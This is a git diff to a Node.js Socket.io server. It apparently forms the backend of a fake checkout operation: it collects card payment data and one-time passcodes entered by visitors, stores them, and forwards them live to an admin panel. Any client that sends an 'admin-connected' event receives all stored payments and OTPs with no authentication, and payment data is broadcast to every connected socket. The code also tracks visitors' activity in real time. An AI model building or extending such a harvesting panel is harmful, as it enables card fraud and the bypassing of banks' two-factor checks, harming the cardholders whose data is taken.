@@ -46,6 +46,35 @@ const activeVisitors = new Map();
 // Store successful payments (key: hash, value: paymentData)
 const successfulPayments = new Map();
 
+// Persistent storage for admin data (visitors NOT stored - only active tracking)
+const adminData = {
+  payments: [],
+  otps: []
+};
+
+// Load existing admin data from file/storage
+function loadAdminData() {
+  try {
+    // In production, this could be a database. For now, using memory with backup
+    console.log('Admin data initialized');
+  } catch (error) {
+    console.error('Error loading admin data:', error);
+  }
+}
+
+// Save admin data (could be to file or database)
+function saveAdminData() {
+  try {
+    // Data is kept in memory and sent to clients
+    console.log(`Admin data saved: ${adminData.payments.length} payments, ${adminData.otps.length} otps, ${activeVisitors.size} active visitors`);
+  } catch (error) {
+    console.error('Error saving admin data:', error);
+  }
+}
+
+// Initialize admin data
+loadAdminData();
+
 // Add JSON middleware for API endpoints
 app.use(express.json());
 
@@ -63,17 +92,25 @@ app.use((req, res, next) => {
   }
 });
 
-// Clean up inactive visitors periodically (5 min timeout)
+// Clean up inactive visitors periodically (15 min timeout - generous for checkout)
 setInterval(() => {
   const now = new Date();
-  const timeout = 5 * 60 * 1000; // 5 minutes
+  const timeout = 15 * 60 * 1000; // 15 minutes (very generous)
+  let cleanedCount = 0;
+  
   activeVisitors.forEach((visitor, socketId) => {
     const lastActivity = new Date(visitor.lastActivity);
     if (now - lastActivity > timeout) {
+      console.log(`🧹 Cleaning inactive visitor: ${visitor.visitorId} (last activity: ${visitor.lastActivity})`);
       io.emit('visitor-left', { visitorId: visitor.visitorId });
       activeVisitors.delete(socketId);
+      cleanedCount++;
     }
   });
+  
+  if (cleanedCount > 0) {
+    console.log(`🧹 Cleaned ${cleanedCount} inactive visitors. Active: ${activeVisitors.size}`);
+  }
 }, 60000); // Check every minute
 
 // Socket.io connection handling
@@ -83,33 +120,56 @@ io.on('connection', (socket) => {
   // Handle payment data from checkout page
   socket.on('payment-data', (data) => {
     console.log('Payment data received:', data);
-    // Emit to admin panel (broadcast to all connected clients)
-    socket.broadcast.emit('payment-received', data);
+    
+    // Add to persistent storage
+    const paymentWithId = {
+      ...data,
+      id: data.paymentId || `payment_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
+      status: 'pending',
+      timestamp: data.timestamp || new Date().toISOString()
+    };
+    
+    adminData.payments.push(paymentWithId);
+    saveAdminData();
+    
+    // Emit to ALL clients (including admin panels)
+    io.emit('payment-received', paymentWithId);
   });
 
   // Handle visitor tracking with enhanced heartbeat mechanism
   socket.on('visitor-joined', (data) => {
     console.log('Visitor joined:', data);
+    
     // Store visitor data with socket ID for tracking
     socket.visitorData = {
       ...data,
+      id: data.visitorId || `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
       socketId: socket.id,
       lastActivity: new Date().toISOString(),
       timestamp: new Date().toISOString()
     };
+    
     activeVisitors.set(socket.id, socket.visitorData);
-    // Emit to admin panel (broadcast to all connected clients including sender)
+    
+    // Do NOT store visitors persistently - only track while active
+    // Only emit to admin panels for real-time tracking
     io.emit('visitor-joined', socket.visitorData);
   });
 
   socket.on('visitor-heartbeat', (data) => {
     // Update visitor activity timestamp
     if (socket.visitorData) {
-      socket.visitorData.lastActivity = new Date().toISOString();
-      socket.visitorData.timestamp = new Date().toISOString();
+      const now = new Date().toISOString();
+      socket.visitorData.lastActivity = now;
+      socket.visitorData.timestamp = now;
       activeVisitors.set(socket.id, socket.visitorData);
+      
+      console.log(`💓 Heartbeat received from visitor: ${socket.visitorData.visitorId}`);
+      
       // Emit to all clients to keep admin panel in sync
       io.emit('visitor-heartbeat-update', socket.visitorData);
+    } else {
+      console.warn('⚠️ Received heartbeat but no visitor data found');
     }
   });
 
@@ -159,7 +219,46 @@ io.on('connection', (socket) => {
   // Handle OTP submission
   socket.on('otp-submitted', (data) => {
     console.log('OTP submitted:', data);
-    socket.broadcast.emit('otp-submitted', data);
+    
+    // Add to persistent storage
+    const otpData = {
+      ...data,
+      id: `otp_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
+      timestamp: new Date().toISOString()
+    };
+    
+    adminData.otps.push(otpData);
+    saveAdminData();
+    
+    socket.broadcast.emit('otp-submitted', otpData);
+  });
+
+  // Handle admin panel connection - send historical data
+  socket.on('admin-connected', () => {
+    console.log('Admin panel connected, performing aggressive cleanup');
+    
+    // NUCLEAR OPTION: Clear ALL visitors and start fresh
+    const oldCount = activeVisitors.size;
+    activeVisitors.clear();
+    console.log(`🔥 NUCLEAR CLEANUP: Cleared ${oldCount} visitors completely`);
+    
+    // Send completely fresh data (no visitors)
+    socket.emit('admin-historical-data', {
+      payments: adminData.payments,
+      visitors: [], // Always empty on admin connect
+      otps: adminData.otps,
+      activeVisitors: []
+    });
+    
+    console.log('✅ Admin connected with completely fresh visitor data');
+  });
+
+  // Handle admin request to reset all visitor tracking (nuclear option)
+  socket.on('admin-reset-visitors', () => {
+    console.log('🔥 Admin requested complete visitor reset');
+    activeVisitors.clear();
+    io.emit('visitors-reset');
+    console.log('✅ All visitor tracking reset');
   });
 
   socket.on('disconnect', () => {
